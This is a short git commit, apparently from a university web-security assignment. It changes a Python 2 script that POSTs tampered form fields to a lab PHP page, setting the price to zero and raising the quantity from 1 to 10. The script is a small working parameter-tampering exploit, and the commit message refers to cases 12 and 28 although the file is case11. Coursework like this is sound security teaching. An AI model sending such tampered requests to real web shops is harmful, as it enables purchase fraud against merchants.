b38eebeeb5013e45d0469bc3a16e97e61ac7da64
Low Wei Kit <weikit@u.nus.edu>
2018-03-14 11:19:40 +0800

    Exploit for case 12 and 28

--- case11.py
+++ case11.py
@@ -1,7 +1,7 @@
 import urllib, urllib2, cookielib, webbrowser, os
 
 url = "http://www.wsb.com/Assignment2/case11.php"
-values = dict(qty="1",Price="0")
+values = dict(qty="10",Price="0")
 data = urllib.urlencode(values)
 req = urllib2.Request(url, data)
 rsp = urllib2.urlopen(req)
